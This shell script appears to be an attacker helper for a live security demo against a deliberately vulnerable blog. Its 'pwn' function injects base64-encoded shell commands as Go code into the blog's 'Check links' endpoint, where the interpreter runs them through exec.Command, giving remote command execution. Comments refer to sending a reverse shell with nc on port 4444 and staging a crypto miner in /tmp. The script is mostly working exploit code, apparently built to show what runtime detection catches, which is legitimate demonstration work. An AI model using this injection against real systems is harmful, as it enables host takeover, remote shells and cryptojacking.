# shellcheck shell=bash
# live-shell.sh — pretty attacker helpers for `make live` pane 1.
# Sourced by the generated .state/live.bashrc. Needs $BLOG in the environment.
#
# Every helper makes ONE real HTTP POST to the blog's "Check links" feature
# (curl --data-urlencode) — the same request a browser makes. They just show the
# request cleanly and strip the link checker's own noise so the pane stays readable.
#
#   link https://www.redhat.com/en        normal, legitimate use
#   pwn  'id'                             run a shell command through the injection
: "${BLOG:?live-shell.sh needs BLOG set}"

_lc_dim=$'\e[2m'; _lc_red=$'\e[31m'; _lc_grn=$'\e[32m'; _lc_blu=$'\e[34m'
_lc_cyn=$'\e[36m'; _lc_b=$'\e[1m'; _lc_n=$'\e[0m'

# The rule engine returns the command's stdout, so injected output comes back clean.
# Drop blank lines (and any stray diagnostic line, just in case).
_lc_tidy() { grep -vaE "^(curl|sh): " | sed '/^[[:space:]]*$/d'; }

# Pretty-print JSON lines (coloured), pass everything else through untouched.
_lc_pretty() {
  local l
  while IFS= read -r l; do
    if printf '%s' "$l" | jq -e . >/dev/null 2>&1; then printf '%s' "$l" | jq -C .; else printf '%s\n' "$l"; fi
  done
}

# The one real HTTP call.
_lc_post() { curl -sk --max-time 20 "$BLOG/api/links/check" --data-urlencode "url=$1"; }

# Normal, legitimate use of the feature.
link() {
  printf '%slink %s%s\n' "$_lc_b" "$1" "$_lc_n"
  printf '%s%s%s\n' "$_lc_grn" "$(_lc_post "$1" | _lc_tidy)" "$_lc_n"
}

# The exploit: run a shell command on the host through the rule engine. The blog evaluates our
# input as Go (yaegi); the app never shells out — the interpreter runs exec.Command for us. The
# command is base64'd so any characters survive the Go string literal.
pwn() {
  printf '%s%sattacker@internet%s:%s~%s$ %s%s\n' "$_lc_b" "$_lc_red" "$_lc_n" "$_lc_blu" "$_lc_n" "$1" "$_lc_n"
  local b64; b64=$(printf '%s' "$1" | base64 | tr -d '\n')
  local gorule="(func() string { c, _ := base64.StdEncoding.DecodeString(\"$b64\"); out, _ := exec.Command(\"sh\", \"-c\", string(c)).Output(); return string(out) })()"
  local out; out=$(_lc_post "$gorule" | _lc_tidy | _lc_pretty)
  if [[ -n $out ]]; then printf '%s%s%s\n' "$_lc_cyn" "$out" "$_lc_n"; else printf '%s(no output)%s\n' "$_lc_dim" "$_lc_n"; fi
  case $1 in
    *nc\ *4444*)   printf '%s↳ reverse shell sent — watch pane 2 (type: id; hostname; ps)%s\n' "$_lc_dim" "$_lc_n" ;;
    *stage.sh*sh*) printf '%s↳ miner staged in /tmp — watch pane 3 for Crypto miner + Container drift%s\n' "$_lc_dim" "$_lc_n" ;;
  esac
}
